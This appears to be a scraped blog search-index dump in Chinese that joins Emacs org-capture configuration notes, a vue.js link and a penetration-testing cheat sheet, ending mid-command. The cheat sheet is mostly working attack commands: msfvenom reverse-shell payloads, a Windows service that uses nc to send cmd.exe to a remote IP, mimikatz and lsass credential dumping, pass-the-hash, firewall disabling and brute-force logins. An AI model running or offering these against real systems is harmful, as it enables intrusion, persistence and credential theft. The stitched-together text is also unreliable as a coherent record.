\"12月账单\" ) \"| %U | %^{people} | %^{物品} | %^{数量} | %^{价格}| \" :prepend t :kill-buffer t)\n        (\"k\" \"考勤清单 List\"      item       (file+headline \"gtd.org\" \"考勤\") \" %? \")\n        (\"j\" \"一句话备忘录   Journal\"   entry      (file+datetree \"journal.org\") \"  %?\")\n        (\"s\" \"Code Snippet\"      entry      (file \"snippets.org\") \" %?\\t%^g\\n#+BEGINSRC %^{language}\\n\\n#+ENDSRC\")\n\n        (\"n\" \"笔记\" entry (file+headline \"notes.org\" \"Quick notes\")\n         \" %?\\n %i\\n %x\\n %u\\n\"\n         :clock-in t)\n\n        ;; To capture ideas for my blog\n        (\"b\"                                  ; key\n         \"Blog\"                               ; name\n         entry                                ; type\n         (file+headline \"notes.org\" \"Blog\")   ; target\n         \" %^{Title} :blog:\\n:PROPERTIES:\\n:Created: %U\\n:END:\\n%i\\n%?\" ; template\n         :prepend t                 ; properties\n         :empty-lines 1             ; properties\n         :created t                 ; properties\n         :kill-buffer t)            ; properties\n\n        (\"l\" \"links\" entry (file+headline \"~/org-notes/notes.org\" \"Quick notes\")\n         \" TODO [#C] %?\\n  %i\\n %a \\n %U\"\n         :empty-lines 1)))\n\n(setq org-capture-templates\n(quote\n(\n(\"l\" \"Later\" checkitem (file+headline \"scratch.org\" \"later\") \" [ ] %?\\n\\n\" :prepend t :kill-buffer t)\n )))\n\n;; 账单\n(\"a\" \"Account\" table-line  (file+headline \"account.org\" \"Web accounts\") \"| %? | | %a | %U |\")\n\nInstead of using %(org-set-tags) in the template, use %^g\n\n(setq org-capture-templates '(\n        ;; For code snippets\n        (\"a\"               ; key\n         \"Algo/Code\"       ; name\n         entry             ; type\n         (file+headline \"~/Dropbox/org/notes.org\" \"Code\")  ; target\n         \" %^{TITLE} %(org-set-tags)  :code:\\n:PROPERTIES:\\n:Created: %U\\n:END:\\n%i\\#+BEGINSRC %^{language}\\n%?\\n\\#ENDSRC\"  ; template\n         :prepend t        ; properties\n         :empty-lines 1    ; properties\n         :created t        ; properties\n         :kill-buffer t)   ; properties\n\n        ;; For taking notes on random things\n        (\"n\"               ; key\n         \"Note\"            ; name\n         entry             ; type\n         (file+headline \"~/Dropbox/org/notes.org\" \"Notes\")  ; target\n         \" %? %(org-set-tags)  :note:\\n:PROPERTIES:\\n:Created: %U\\n:Linked: %A\\n:END:\\n%i\"  ; template\n         :prepend t        ; properties\n         :empty-lines 1    ; properties\n         :created t        ; properties\n         :kill-buffer t)   ; properties\n\n        ;; Ledger is a CLI accounting system\n        (\"l\"               ; key\n         \"Ledger\"          ; name\n         entry             ; type\n         (file+datetree \"~/Dropbox/org/ledger.org\" \"Ledger\")  ; target\n         \" %^{expense} %(org-set-tags)  :accounts:\\n:PROPERTIES:\\n:Created: %U\\n:END:\\n%i\n+NAME: %\\\\1-%t\n\\+BEGINSRC ledger :noweb yes\n%^{Date of expense (yyyy/mm/dd)} %^{'' if cleared, else blank} %\\\\1\n    %^{Account name}                                $%^{Amount}\n    %?\n\\#+ENDSRC\n\"  ; template\n         :prepend t        ; properties\n         :empty-lines 1    ; properties\n         :created t        ; properties\n         :kill-buffer t)   ; properties\n\n        ;; For notes or something regarding more work\n        (\"w\"               ; key\n         \"Work\"            ; name\n         entry             ; type\n         (file+headline \"~/Dropbox/org/phd.org\" \"Work\")  ; target\n         \" TODO %^{Todo} %(org-set-tags)  :work:\\n:PROPERTIES:\\n:Created: %U\\n:END:\\n%i\\n%?\"  ; template\n         :prepend t        ; properties\n         :empty-lines 1    ; properties\n         :created t        ; properties\n         :kill-buffer t)   ; properties\n\n        ;; For capturing some things that are worth reading\n        (\"r\"               ; key\n         \"Reading\"         ; name\n         entry             ; type\n         (file+headline \"~/Dropbox/org/fun.org\" \"Reading\")  ; target\n         \" %^{Title} %(org-set-tags)\\n:PROPERTIES:\\n:Created: %U\\n:END:\\n%i\\n%?\"  ; template\n         :prepend t        ; properties\n         :empty-lines 1    ; properties\n         :created t        ; properties\n         :kill-buffer t)   ; properties\n\n        ;; For capturing minutes of the meeting\n        (\"m\"               ; key\n         \"Meeting\"         ; name\n         entry             ; type\n         (file+datetree \"~/Dropbox/org/phd.org\" \"Meeting\")  ; target\n         \" %^{Title} %(org-set-tags)  :meeting:\\n:PROPERTIES:\\n:Created: %U\\n:END:\\n%i\\n Agenda:\\n%?\\n\\n Minutes of the meeting:\\n\"  ; template\n         :prepend t        ; properties\n         :empty-lines 1    ; properties\n         :created t        ; properties\n         :kill-buffer t)   ; properties\n\n        ;; To practice for my driving test\n        (\"d\"               ; key\n         \"Drill driving\"   ; name\n         entry             ; type\n         (file+headline \"~/Dropbox/org/drill.org\" \"Driving\")  ; target\n         \" Question  :drill:driving:\\n%^{Question}\\n Answer\\n%?\"  ; template\n         :prepend t        ; properties\n         :empty-lines 1    ; properties\n         :created t        ; properties\n         :kill-buffer t)   ; properties\n\n        ;; For taking notes of math/stats stuff that I keep forgetting\n        (\"s\"              ; key\n         \"Drill math\"     ; name\n         entry            ; type\n         (file+headline \"~/Dropbox/org/drill.org\" \"Stats/Math\")  ; target\n         \" Question  :drill:stats:math:\\n%^{Question}\\n* Answer\\n%?\"  ; template\n         :prepend t        ; properties\n         :empty-lines 1    ; properties\n         :created t        ; properties\n         :kill-buffer t)   ; properties\n\n        ;; For capturing some physics concepts that I need to remember\n        (\"p\"              ; key\n         \"Drill physics\"  ; name\n         entry            ; type\n         (file+headline \"~/Dropbox/org/drill.org\" \"Physics\")  ; target\n         \" Question  :drill:physics:\\n%^{Question}\\n* Answer\\n%?\"  ; template\n         :prepend t        ; properties\n         :empty-lines 1    ; properties\n         :created t        ; properties\n         :kill-buffer t)   ; properties\n\n        ;; For capturing details of a job application/details\n        (\"j\"                      ; key\n         \"Jobs\"                   ; name\n         table-line               ; type\n         (file+headline \"~/Dropbox/org/notes.org\" \"Jobs\")  ; target\n         \"| %u | %^{Company} | [%^{job link}] | %^{referrals?} | %^{Experience?} | %^t | %^{Status} | %^{Follow up} | %^{Result} |\"  ; template\n         :prepend t               ; properties\n         ;; :table-line-pos \"II-3\"   ; properties\n         :empty-lines 1           ; properties\n         :created t               ; properties\n         :kill-buffer t)          ; properties\n\n        ;; To capture movies that I plan to see\n        (\"f\"              ; key\n         \"films\"          ; name\n         entry            ; type\n         (file+headline \"~/Dropbox/org/fun.org\" \"Movies\")  ; target\n         \" %^{Movie} %(org-set-tags)  :film:\\n:PROPERTIES:\\n:Created: %U\\n:END:\\n%i\nNetflix?: %^{netflix? Yes/No}\\nGenre: %^{genre}\\nDescription:\\n%?\"  ; template\n         :prepend t        ; properties\n         :empty-lines 1    ; properties\n         :created t        ; properties\n         :kill-buffer t)   ; properties\n\n        ;; To capture ideas for my blog\n        (\"b\"               ; key\n         \"Blog\"            ; name\n         entry             ; type\n         (file+headline \"~/Dropbox/org/blog.org\" \"Blog\")  ; target\n         \" %^{Title} %(org-set-tags)  :blog:\\n:PROPERTIES:\\n:Created: %U\\n:END:\\n%i\\n%?\"  ; template\n         :prepend t        ; properties\n         :empty-lines 1    ; properties\n         :created t        ; properties\n         :kill-buffer t)   ; properties\n\n        ;; To capture tons of errands\n        (\"e\"               ; key\n         \"Errands\"         ; name\n         entry             ; type\n         (file+headline \"~/Dropbox/org/errands.org\" \"Errands\")  ; target\n         \" TODO %^{Todo} %(org-set-tags)  :errands:\\n:PROPERTIES:\\n:Created: %U\\n:END:\\n%i\\n%?\"  ; template\n         :prepend t        ; properties\n         :empty-lines 1    ; properties\n         :created t        ; properties\n         :kill-buffer t)   ; properties\n\n        ;; To capture things regarding my course\n        (\"c\"               ; key\n         \"Courses\"         ; name\n         entry             ; type\n         (file+headline \"~/Dropbox/org/phd.org\" \"Courses\")  ; target\n         \" %^{Course} %(org-set-tags)  :courses:\\n:PROPERTIES:\\n:Created: %U\\n:END:\\n%i\\n%?\"  ; template\n         :prepend t        ; properties\n         :empty-lines 1    ; properties\n         :created t        ; properties\n         :kill-buffer t))) ; properties\n;; %[file]     插入文件\n;; %(sexp)     插入 sexp 的返回值，sexp 必须返回字符串\n;; %...      插入时间戳信息\n;; %t          插入日期\n;; %T          插入日期与时间\n;; %u, %U      同上，但时间戳用 [] 括起来\n;; %i          调用 capture 命令时有选中的内容则插入选中的内容\n;; %a          注记，通常是 org-store-link 创建的链接\n;; %A          类似 %a，但提示输入链接的描述\n;; %l          类似 %a，但仅插入文本链接\n;; %c          当前 kill-ring 中的内容\n;; %x          粘贴板的内容\n;; %k          当前计时任务标题\n;; %K          当前计时任务链接\n;; %n          用户名，变量 user-full-name\n;; %f          capture 命令调用时当前 buffer 对应文件名\n;; %F          类似 %f，但显示全路径\n;; %:keyword   Specific information for certain link types, see below.\n;; %^g         提示输入 tag，target file 中的列表作为可选项\n;; %^G         类似 %^g，但是有 agenda 中所有注册的文件中的 tag 作为可选项\n;; %^t         类似 %t,但提示手动输入日期，类似还有 %^T， %^u， %^U                 You may define a prompt like %^{Birthday}t.\n;; %^C         提示插入哪个 kill-ring 的内容\n;; %^L         类似 %^C，但插入为链接\n;; %^{prop}p   Prompt the user for a value for property prop.\n;; %^{prompt}  prompt the user for a string and replace this sequence with it.\n;;             You may specify a default value and a completion table with\n;;             %^{prompt|default|completion2|completion3...}.\n;;             The arrow keys access a prompt-specific history.\n;; %\\n         Insert the text entered at the nth %^{prompt}, where n is\n;;             a number, starting from 1.\n;; %?          After completing the template, position cursor here.\n\n;; properties\n      ;; :prepend 通常情况下,新捕获的内容会附加在target location的后面,而该属性会添加在target location的前面\n      ;; :immediate-finish 该属性表示不需要显示capture buffer给用户输入更多的信息.直接返回就好. 若所有的信息都能够通过模板变量自动获得的情况下可以使用\n      ;; :empty-lines 插入新捕获的内容时,前后空出多少个空行.\n      ;; :clock-in 为新捕获的item开始计时\n      ;; :clock-keep 若设置了clock-in,则在capture动作完成后,依然保持计时器的继续运行\n      ;; :clock-resume\n      ;; 若capture操作中断了对之前任务的计时,则在完成capture操作之后继续对之前任务进行计时.\n      ;; 需要注意的是,:clock-keep的优先级高于:clock-resume,若两者都设置为t,则当前计时器会启动,而前一个计时器不会继续运行.\n      ;; :unnarrowed 不要narrow target buffer,显示target buffer的所有内容. 默认情况下会narrow target buffer,让它只显示捕获新事物的那节点内容\n      ;; :table-line-pos 设置capture的内容插入到table的位置. 它的格式类似于”II-3”,表示它是表格中第二部分(以——-分隔)的第三行\n      ;; :kill-buffer 若target file是未打开的状态,则在capture完成之后,自动kill掉新打开的buffer\n\nEmacs的配置\norg capture的启用设定\n\n在emacs的启动配置文件中，使用如下代码完成org capture的启用。\n\n(setq org-default-notes-file (concat org-directory \"~/notes.org\"))\n(define-key global-map \"\\C-cc\" 'org-capture)\n\n代码解释如下：\n\n    (setq org-default-notes-file (concat org-directory \"~/notes.org\"))\n    设定默认的片段存放文件名为Home目录中的“notes.org”文件。在Windows中“~/notes.org”也可以写做“d:/home/notes.org”\n\n    (define-key global-map \"\\C-cc\" 'org-capture)\n    使用组合键“Ctrl-c c”激活org capture功能。当然，如果使用“Alt-x”组合键后输入 org-capture enter 也可以达到同样的目的。\n\n配置模板\n\n利用我们上面介绍的内容，我们可以开始定义我们要用到的模板信息：\n\n(setq org-capture-templates\n   '((\"l\" \"灵感\" entry (file+headline \"~/写作创意.org\" \"创意\")\n          \" %?\\n  %i\\n  %a\")\n     (\"j\" \"Journal\" entry (file+datetree \"~/journal.org\")\n          \"* %?\\n输入于： %U\\n  %i\\n  %a\")))\n          Capture的模板\n\n          在Capture的基本使用流程之中，我们提到了一个名词“模板”。什么是模板？\n\n          我们来试着定义一下，所谓的模板是：\n\n              一个记录事件的加速系统，通过简单的几个按键就可以定位到一个具体的记录类别\n              一个快速记录事件的框架，类似网站的表单，通些必要的字段即可完成事件记录。\n              一个归档位置的快速定义，不同类别的记录可以按设定记录在不同的文件里，方便查询。\n\n          一个有效的模板由以下几个部分组成：\n\n              快捷键 - keys\n              用于在列表中快速选择模板。支持单个字符。嗯，多个字符的快捷键有待进一步研究。\n              描述 - description\n              简单的描述模板的用途。这部分设定会出现在选择模板的过程中\n\n              类型 - type\n              模板的种类。目前支持的取值为：\n                  entry\n                  Org Mode的标题节点。使用中须指定Org文件的名称\n                  item\n                  一个简单列表中的项目。同样，这个类型的模板最终需要存储在org文件中。\n                  checkitem\n                  一个带有checkbox的项目。与item类型的模板相比，多了一个checkbox。\n                  table-line\n                  在指定位置表格添加一行新的记录。\n                  plain\n                  一段文字。如何输入的，就如何记录下来。\n\n              注：org文件：扩展名为org的文本文件。遵循org mode定义的各类文本文件编写规则。目前Emacs对org mode的支持最好（org mode就是在emacs中用elisp编写开发的）。\n\n              目标 - target\n              用于定义收集得到的文字片段在文件的存储方式。一般来说，目标文件为一个org文件。收集得到的相关内容也会记录到相应的标题之下。最常用的target是：\n\n                  指定文件名和文件中唯一的标题\n\n                  (file+headline \"path/to/file\" \"node headline\")\n\n                  指定文件名和完整的标题路径（如果需要存放片段的标题不唯一）\n\n                  (file+olp \"path/to/file\" \"Level 1 heading\" \"Level 2\" ...)\n\n                  指定日期方式的标题路径，在今天的日期下添加片段\n\n                  (file+datetree \"path/to/file\")\n\n                  4.3 预定义tag\n\n                  上面提到，除了可以输入标签外，还可以从预定义的标签中进行选择。预定义的方式有两种：\n\n                      在当前文件头部定义\n\n                      这种方式预定义的标签只能在当前文件中使用。使用#+TAGS元数据进行标记，如：\n\n                          #+TAGS: { 桌面(d) 服务器(s) }  编辑器(e) 浏览器(f) 多媒体(m) 压缩(z)    \n\n                      每项之间必须用空格分隔，可以在括号中定义一个快捷键；花括号里的为标签组，只能选择一个\n\n                      对标签定义进行修改后，要在标签定义的位置按 C-c C-c 刷新才能生效。\n                      在配置文件中定义 上面的标签定义只能在当前文件生效，如果要在所有的.org 文件中生效，需要在 Emacs 配置文件 .emacs 中进行定义：\n                      (setq org-tag-alist '(\n\n                                          (:startgroup . nil)\n                                               (\"桌面\" . ?d) (\"服务器\" . ?s)\n                                          (:endgroup . nil)\n                                          (\"编辑器\" . ?e)\n                                          (\"浏览器\" . ?f)\n                                          (\"多媒体\" . ?m)\n                                          ))    \n\n                  默认情况下，org会动态维护一个Tag列表，即当前输入的标签若不在列表中，则自动加入列表以供下次补齐使用。\n\n                  为了使这几种情况（默认列表、文件预设tags，全局预设tags）同时生效，需要在文件中增加一个空的TAGS定义：\n\n                      #+TAGS:","tags":null},{"location":"//blog.pytool.com/Post/前端技术/vue/2016-12-08 vue.js","title":"vue.js","text":"wakeupmypig/vue: 这是一个vue仓库","tags":null},{"location":"//blog.pytool.com/Hacker/精华/2016-07-06 渗透测试工具实战技巧合集","title":"渗透测试工具实战技巧合集","text":"渗透测试工具实战技巧合集 - FreeBuf.COM | 关注黑客与极客\n\n最好的 NMAP 扫描策略\n\n适用所有大小网络最好的 nmap 扫描策略\n\n 主机发现，生成存活主机列表\n$ nmap -sn -T4 -oG Discovery.gnmap 192.168.56.0/24\n$ grep \"Status: Up\" Discovery.gnmap | cut -f 2 -d ' '   LiveHosts.txt\n\n端口发现，发现大部分常用端口\n http://nmap.org/presentations/BHDC08/bhdc08-slides-fyodor.pdf\n$ nmap -sS -T4 -Pn -oG TopTCP -iL LiveHosts.txt\n$ nmap -sU -T4 -Pn -oN TopUDP -iL LiveHosts.txt\n$ nmap -sS -T4 -Pn --top-ports 3674 -oG 3674 -iL LiveHosts.txt\n\n端口发现，发现全部端口，但 UDP 端口的扫描会非常慢\n$ nmap -sS -T4 -Pn -p 0-65535 -oN FullTCP -iL LiveHosts.txt\n$ nmap -sU -T4 -Pn -p 0-65535 -oN FullUDP -iL LiveHosts.txt\n\n 显示 TCP\\UDP 端口\n$ grep \"open\" FullTCP|cut -f 1 -d ' ' | sort -nu | cut -f 1 -d\nsmbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw\n\nKali 下编译 Exploit\n\ngcc -m32 -o output32 hello.c (32 位)\ngcc -m64 -o output hello.c (64 位)\nKali 下编译 Windows Exploit\nwget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download\nwine mingw-get-setup.exe\nselect mingw32-base\ncd /root/.wine/drivec/windows\nwget http://gojhonny.com/misc/mingwbin.zip \u0026\u0026 unzip mingwbin.zip\ncd /root/.wine/drivec/MinGW/bin\nwine gcc -o ability.exe /tmp/exploit.c -lwsock32\nwine ability.exe\nNASM 命令\n注：NASM 全称 The Netwide Assembler，是一款基于80×86和x86-64平台的汇编语言编译程序，其设计初衷是为了实现编译器程序跨平台和模块化的特性。\n\nnasm -f bin -o payload.bin payload.asm\nnasm -f elf payload.asm; ld -o payload payload.o; objdump -d payload\nSSH 穿透\nssh -D 127.0.0.1:1080 -p 22 user@IP\nAdd socks4 127.0.0.1 1080 in /etc/proxychains.conf\nproxychains commands target\nSSH 穿透从一个网络到另一个网络\nssh -D 127.0.0.1:1080 -p 22 user1@IP1\nAdd socks4 127.0.0.1 1080 in /etc/proxychains.conf\nproxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2\nAdd socks4 127.0.0.1 1081 in /etc/proxychains.conf\nproxychains commands target\n使用 metasploit 进行穿透\nroute add X.X.X.X 255.255.255.0 1\nuse auxiliary/server/socks4a\nrun\nproxychains msfcli windows/ PAYLOAD=windows/meterpreter/reversetcp LHOST=IP LPORT=443 RHOST=IP E\n或者\nhttps://www.offensive-security.com/metasploit-unleashed/pivoting/\nmeterpreter   ipconfig\nIP Address  : 10.1.13.3\nmeterpreter   run autoroute -s 10.1.13.0/24\nmeterpreter   run autoroute -p\n10.1.13.0          255.255.255.0      Session 1\nmeterpreter   Ctrl+Z\nmsf auxiliary(tcp)   use exploit/windows/smb/psexec\nmsf exploit(psexec)   set RHOST 10.1.13.2\nmsf exploit(psexec)   exploit\nmeterpreter   ipconfig\nIP Address  : 10.1.13.2\n基于 CSV 文件查询 Exploit-DB\ngit clone https://github.com/offensive-security/exploit-database.git\ncd exploit-database\n./searchsploit –u\n./searchsploit apache 2.2\n./searchsploit \"Linux Kernel\"\n\ncat files.csv | grep -i linux | grep -i kernel | grep -i local | grep -v dos | uniq | grep 2.6 | egrep \"\u003c|\u003c=\" | sort -k3\nMSF Payloads\nmsfvenom -p windows/meterpreter/reversetcp LHOST=IP Address X   system.exe\nmsfvenom -p php/meterpreter/reversetcp LHOST=IP Address LPORT=443 R   exploit.php\nmsfvenom -p windows/meterpreter/reversetcp LHOST=IP Address LPORT=443 -e -a x86 --platform win -f asp -o file.asp\nmsfvenom -p windows/meterpreter/reversetcp LHOST=IP Address LPORT=443 -e x86/shikataganai -b \"\\x00\" -a x86 --platform win -f c\nMSF 生成在 Linux 下反弹的 Meterpreter Shell\nmsfvenom -p linux/x86/meterpreter/reversetcp LHOST=IP Address LPORT=443 -e -f elf -a x86 --platform linux -o shell\nMSF 生成反弹 Shell (C Shellcode)\nmsfvenom -p windows/shellreversetcp LHOST=127.0.0.1 LPORT=443 -b \"\\x00\\x0a\\x0d\" -a x86 --platform win -f c\nMSF 生成反弹 Python Shell\nmsfvenom -p cmd/unix/reversepython LHOST=127.0.0.1 LPORT=443 -o shell.py\nMSF 生成反弹 ASP Shell\nmsfvenom -p windows/meterpreter/reversetcp LHOST=Your IP Address LPORT=Your Port to Connect On -f asp -a x86 --platform win -o shell.asp\nMSF 生成反弹 Bash Shell\nmsfvenom -p cmd/unix/reversebash LHOST=Your IP Address LPORT=Your Port to Connect On -o shell.sh\nMSF 生成反弹 PHP Shell\nmsfvenom -p php/meterpreterreversetcp LHOST=Your IP Address LPORT=Your Port to Connect On -o shell.php\nadd \u003c?php at the beginning\nperl -i~ -0777pe's/^/\u003c?php \\n/' shell.php\nMSF 生成反弹 Win Shell\nmsfvenom -p windows/meterpreter/reversetcp LHOST=Your IP Address LPORT=Your Port to Connect On -f exe -a x86 --platform win -o shell.exe\nLinux 常用安全命令\n 使用 uid 查找对应的程序\nfind / -uid 0 -perm -4000\n\n查找哪里拥有写权限\nfind / -perm -o=w\n\n 查找名称中包含点和空格的文件\nfind / -name \" \" -print\nfind / -name \"..\" -print\nfind / -name \". \" -print\nfind / -name \" \" -print\n\n查找不属于任何人的文件\nfind / -nouser\n\n 查找未链接的文件\nlsof +L1\n\n获取进程打开端口的信息\nlsof -i\n\n 看看 ARP 表中是否有奇怪的东西\narp -a\n\n查看所有账户\ngetent passwd\n\n 查看所有用户组\ngetent group\n\n列举所有用户的 crontabs\nfor user in $(getent passwd|cut -f1 -d:); do echo \" Crontabs for $user ####\"; crontab -u $user -l; done\n\n生成随机密码\ncat /dev/urandom| tr -dc ‘a-zA-Z0-9-!@$%^\u0026()+{}|:?=’|fold -w 12| head -n 4\n\n查找所有不可修改的文件\nfind . | xargs -I file lsattr -a file 2  /dev/null | grep ‘^….i’\n\n 使文件不可修改\nchattr -i file\nWindows 缓冲区溢出利用命令\nmsfvenom -p windows/shellbindtcp -a x86 --platform win -b \"\\x00\" -f c\nmsfvenom -p windows/meterpreter/reversetcp LHOST=X.X.X.X LPORT=443 -a x86 --platform win -e x86/shikataganai -b \"\\x00\" -f c\n\nCOMMONLY USED BAD CHARACTERS:\n\\x00\\x0a\\x0d\\x20                              For http request\n\\x00\\x0a\\x0d\\x20\\x1a\\x2c\\x2e\\3a\\x5c           Ending with (0\\n\\r)\n\n常用命令:\npattern create\npattern offset (EIP Address)\npattern offset (ESP Address)\nadd garbage upto EIP value and add (JMP ESP address) in EIP . (ESP = shellcode )\n\n!pvefindaddr patterncreate 5000\n!pvefindaddr suggest\n!pvefindaddr modules\n!pvefindaddr nosafeseh\n\n!mona config -set workingfolder C:\\Mona\\%p\n!mona config -get workingfolder\n!mona mod\n!mona bytearray -b \"\\x00\\x0a\"\n!mona pc 5000\n!mona po EIP\n!mona suggest\nSEH – 结构化异常处理\n\n注：SEH(“Structured Exception Handling”)，即结构化异常处理，是 windows 操作系统提供给程序设计者的强有力的处理程序错误或异常的武器。\n https://en.wikipedia.org/wiki/Microsoft-specificexceptionhandlingmechanisms#SEH\nhttp://baike.baidu.com/view/243131.htm\n!mona suggest\n!mona nosafeseh\nnseh=\"\\xeb\\x06\\x90\\x90\" (next seh chain)\niseh= !pvefindaddr p1 -n -o -i (POP POP RETRUN or POPr32,POPr32,RETN)\nROP (DEP)\n\n注：ROP(“Return-Oriented Programming”)是计算机安全漏洞利用技术，该技术允许攻击者在安全防御的情况下执行代码，如不可执行的内存和代码签名。\n\nDEP(“Data Execution Prevention”)是一套软硬件技术，在内存上严格将代码和数据进行区分，防止数据当做代码执行。\n https://en.wikipedia.org/wiki/Return-orientedprogramming\nhttps://zh.wikipedia.org/wiki/%E8%BF%94%E5%9B%9E%E5%AF%BC%E5%90%91%E7%BC%96%E7%A8%8B\n https://en.wikipedia.org/wiki/DataExecutionPrevention\nhttp://baike.baidu.com/item/DEP/7694630\n!mona modules\n!mona ropfunc -m .dll -cpb \"\\x00\\x09\\x0a\"\n!mona rop -m .dll -cpb \"\\x00\\x09\\x0a\" (auto suggest)\nASLR – 地址空间格局随机化\n https://en.wikipedia.org/wiki/Addressspacelayoutrandomization\nhttp://baike.baidu.com/view/3862310.htm\n!mona noaslr\n寻蛋(EGG Hunter)技术\n\nEgg hunting这种技术可以被归为“分级shellcode”，它主要可以支持你用一小段特制的shellcode来找到你的实际的（更大的）shellcode（我们的‘鸡蛋‘），原理就是通过在内存中搜索我们的最终shellcode。换句话说，一段短代码先执行，然后再去寻找真正的shellcode并执行。– 参考自看雪论坛，更多详情可以查阅我在代码注释中增加的链接。\n https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/\nhttp://www.pediy.com/kssd/pediy12/116190/831793/45248.pdf\n http://www.fuzzysecurity.com/tutorials/expDev/4.html\n!mona jmp -r esp\n!mona egg -t lxxl\n\\xeb\\xc4 (jump backward -60)\nbuff=lxxllxxl+shell\n!mona egg -t 'w00t'\nGDB Debugger 常用命令\n\n僵尸网络扫描, 首先需要找到僵尸网络的IP\n$ nmap -sI [Zombie IP] [Target IP]\n\n 指定源端口号\n$ nmap --source-port 80 IP\n\n在每个扫描数据包后追加随机数量的数据\n$ nmap --data-length 25 IP\n\n MAC 地址欺骗，可以生成不同主机的 MAC 地址\n$ nmap --spoof-mac Dell/Apple/3Com IP\nNmap 进行 Web 漏洞扫描\ncd /usr/share/nmap/scripts/\nwget http://www.computec.ch/projekte/vulscan/download/nmapnsevulscan-2.0.tar.gz \u0026\u0026 tar xzf nmapnsevulscan-2.0.tar.gz\nnmap -sS -sV --script=vulscan/vulscan.nse target\nnmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv target\nnmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv -p80 target\nnmap -PN -sS -sV --script=vulscan –script-args vulscancorrelation=1 -p80 target\nnmap -sV --script=vuln target\nnmap -PN -sS -sV --script=all –script-args vulscancorrelation=1 target\n使用 DIRB 爆破目录\n注：DIRB 是一个专门用于爆破目录的工具，在 Kali 中默认已经安装，类似工具还有国外的patator，dirsearch，DirBuster， 国内的御剑等等。\n\ndirb http://IP:PORT /usr/share/dirb/wordlists/common.txt\n\nPatator – 全能暴力破解测试工具\n\ngit clone https://github.com/lanjelot/patator.git /usr/share/patator\n\n SMTP 爆破\n$ patator smtplogin host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst\n$ patator smtplogin host=192.168.17.129 user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst\n$ patator smtplogin host=192.168.17.129 helo='ehlo 192.168.17.128' user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst\n$ patator smtplogin host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst -x ignore:fgrep='incorrect password or account name'\n使用 Fierce 爆破 DNS\n\n注：Fierce 会检查 DNS 服务器是否允许区域传送。如果允许，就会进行区域传送并通知用户，如果不允许，则可以通过查询 DNS 服务器枚举主机名。类似工具：subDomainsBrute 和 SubBrute 等等\nhttp://ha.ckers.org/fierce/\n$ ./fierce.pl -dns example.com\n$ ./fierce.pl –dns example.com –wordlist myWordList.txt\n使用 Nikto 扫描 Web 服务\nnikto -C all -h http://IP\n扫描 WordPress\ngit clone https://github.com/wpscanteam/wpscan.git \u0026\u0026 cd wpscan\n./wpscan –url http://IP/ –enumerate p\nHTTP 指纹识别\nwget http://www.net-square.com/assets/httprintlinux301.zip \u0026\u0026 unzip httprintlinux301.zip\ncd httprint301/linux/\n./httprint -h http://IP -s signatures.txt\n使用 Skipfish 扫描\n\n注：Skipfish 是一款 Web 应用安全侦查工具，Skipfish 会利用递归爬虫和基于字典的探针生成一幅交互式网站地图，最终生成的地图会在通过安全检查后输出。\nskipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u http://IP\n使用 NC 扫描\nnc -v -w 1 target -z 1-1000\nfor i in {101..102}; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done\nUnicornscan\n\n注：Unicornscan 是一个信息收集和安全审计的工具。\nus -H -msf -Iv 192.168.56.101 -p 1-65535\nus -H -mU -Iv 192.168.56.101 -p 1-65535\n\n-H 在生成报告阶段解析主机名\n-m 扫描类型 (sf - tcp, U - udp)\n-Iv - 详细\n使用 Xprobe2 识别操作系统指纹\nxprobe2 -v -p tcp:80:open IP\n枚举 Samba\nnmblookup -A target\nsmbclient //MOUNT/share -I target -N\nrpcclient -U \"\" target\nenum4linux target\n枚举 SNMP\nsnmpget -v 1 -c public IP\nsnmpwalk -v 1 -c public IP\nsnmpbulkwalk -v2c -c public -Cn0 -Cr10 IP\n实用的 Windows cmd 命令\nnet localgroup Users\nnet localgroup Administrators\nsearch dir/s .doc\nsystem(\"start cmd.exe /k $cmd\")\nsc create microsoftupdate binpath=\"cmd /K start c:\\nc.exe -d ip-of-hacker port -e cmd.exe\" start= auto error= ignore\n/c C:\\nc.exe -e c:\\windows\\system32\\cmd.exe -vv 23.92.17.103 7779\nmimikatz.exe \"privilege::debug\" \"log\" \"sekurlsa::logonpasswords\"\nProcdump.exe -accepteula -ma lsass.exe lsass.dmp\nmimikatz.exe \"sekurlsa::minidump lsass.dmp\" \"log\" \"sekurlsa::logonpasswords\"\nC:\\temp\\procdump.exe -accepteula -ma lsass.exe lsass.dmp 32 位系统\nC:\\temp\\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp 64 位系统\nPuTTY 连接隧道\n转发远程端口到目标地址\nplink.exe -P 22 -l root -pw \"1234\" -R 445:127.0.0.1:445 IP\nMeterpreter 端口转发\n https://www.offensive-security.com/metasploit-unleashed/portfwd/\n转发远程端口到目标地址\nmeterpreter   portfwd add –l 3389 –p 3389 –r 172.16.194.141\nkali   rdesktop 127.0.0.1:3389\n开启 RDP 服务\nreg add \"hklm\\system\\currentcontrolset\\control\\terminal server\" /f /v fDenyTSConnections /t REGDWORD /d 0\nnetsh firewall set service remoteadmin enable\nnetsh firewall set service remotedesktop enable\n关闭 Windows 防火墙\nnetsh firewall set opmode disable\n\nMeterpreter VNC\\RDP\n\n https://www.offensive-security.com/metasploit-unleashed/enabling-remote-desktop/\nrun getgui -u admin -p 1234\nrun vnc -p 5043\n使用 Mimikatz\n\n获取 Windows 明文用户名密码\ngit clone https://github.com/gentilkiwi/mimikatz.git\nprivilege::debug\nsekurlsa::logonPasswords full\n获取哈希值\ngit clone https://github.com/byt3bl33d3r/pth-toolkit\npth-winexe -U hash //IP cmd\n或者\napt-get install freerdp-x11\nxfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP\n在或者\nmeterpreter   run 